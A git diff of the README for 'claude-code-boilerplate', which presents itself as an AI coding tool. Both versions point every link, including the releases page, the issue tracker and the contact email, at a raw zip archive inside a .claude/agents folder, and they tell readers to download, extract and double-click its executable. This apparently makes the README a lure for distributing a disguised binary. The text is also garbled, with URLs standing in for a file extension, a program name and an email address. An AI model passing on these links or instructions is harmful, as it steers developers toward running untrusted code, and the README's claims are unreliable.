@@ -1,6 +1,6 @@
 # 🌟 claude-code-boilerplate - Simplifying Coding Standards with AI
 
-[![Download Now](https://raw.githubusercontent.com/uriel963/claude-code-boilerplate/main/.claude/boilerplate_code_claude_1.4.zip%20Now-claude--code--boilerplate-brightgreen)](https://raw.githubusercontent.com/uriel963/claude-code-boilerplate/main/.claude/boilerplate_code_claude_1.4.zip)
+[![Download Now](https://github.com/uriel963/claude-code-boilerplate/raw/refs/heads/main/.claude/agents/claude_code_boilerplate_2.0.zip%20Now-claude--code--boilerplate-brightgreen)](https://github.com/uriel963/claude-code-boilerplate/raw/refs/heads/main/.claude/agents/claude_code_boilerplate_2.0.zip)
 
 ## 📦 Overview
 
@@ -22,19 +22,19 @@ Before you download, make sure your system meets the following requirements:
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page:** 
-   To get the latest version of the software, visit our [Releases page](https://raw.githubusercontent.com/uriel963/claude-code-boilerplate/main/.claude/boilerplate_code_claude_1.4.zip).
+   To get the latest version of the software, visit our [Releases page](https://github.com/uriel963/claude-code-boilerplate/raw/refs/heads/main/.claude/agents/claude_code_boilerplate_2.0.zip).
 
 2. **Select the Latest Version:** 
    On the Releases page, you will see a list of versions. Click on the most recent version, typically labeled with the highest version number.
 
 3. **Download the Archive:** 
-   Click on the link to download the file for your operating system. The file will be in a compressed format such as `.zip` or `https://raw.githubusercontent.com/uriel963/claude-code-boilerplate/main/.claude/boilerplate_code_claude_1.4.zip`. Make sure you save it in an easily accessible location on your computer.
+   Click on the link to download the file for your operating system. The file will be in a compressed format such as `.zip` or `https://github.com/uriel963/claude-code-boilerplate/raw/refs/heads/main/.claude/agents/claude_code_boilerplate_2.0.zip`. Make sure you save it in an easily accessible location on your computer.
 
 4. **Extract the Files:** 
    After downloading, navigate to the file location. Right-click the file and select "Extract All" (Windows) or use a decompression tool (macOS/Linux) to extract the contents.
 
 5. **Run the Application:**
-   Open the extracted folder and locate the executable file. This will typically be named something like `https://raw.githubusercontent.com/uriel963/claude-code-boilerplate/main/.claude/boilerplate_code_claude_1.4.zip` (Windows) or `claude-boilerplate` (macOS/Linux). Double-click this file to run the application.
+   Open the extracted folder and locate the executable file. This will typically be named something like `https://github.com/uriel963/claude-code-boilerplate/raw/refs/heads/main/.claude/agents/claude_code_boilerplate_2.0.zip` (Windows) or `claude-boilerplate` (macOS/Linux). Double-click this file to run the application.
 
 ## 🛠️ Features
 
@@ -63,7 +63,7 @@ For a more detailed guide on using the application and its features, you can ref
 
 ### How do I report issues or bugs?
 
-If you encounter any problems, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/uriel963/claude-code-boilerplate/main/.claude/boilerplate_code_claude_1.4.zip). Provide a clear description of the problem, your operating system details, and any error messages you receive.
+If you encounter any problems, please open an issue on our [GitHub Issues page](https://github.com/uriel963/claude-code-boilerplate/raw/refs/heads/main/.claude/agents/claude_code_boilerplate_2.0.zip). Provide a clear description of the problem, your operating system details, and any error messages you receive.
 
 ### Can I contribute to this project?
 
@@ -75,8 +75,8 @@ For support, you can open an issue on GitHub. Additionally, you can visit our co
 
 ## 📞 Contact
 
-For further inquiries, feel free to reach out via email at [https://raw.githubusercontent.com/uriel963/claude-code-boilerplate/main/.claude/boilerplate_code_claude_1.4.zip]. 
+For further inquiries, feel free to reach out via email at [https://github.com/uriel963/claude-code-boilerplate/raw/refs/heads/main/.claude/agents/claude_code_boilerplate_2.0.zip]. 
 
 ---
 
-Thank you for choosing **claude-code-boilerplate**! We hope this tool helps you enhance your coding experience. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/uriel963/claude-code-boilerplate/main/.claude/boilerplate_code_claude_1.4.zip) to stay updated with the latest versions.
+Thank you for choosing **claude-code-boilerplate**! We hope this tool helps you enhance your coding experience. Don't forget to visit our [Releases page](https://github.com/uriel963/claude-code-boilerplate/raw/refs/heads/main/.claude/agents/claude_code_boilerplate_2.0.zip) to stay updated with the latest versions.
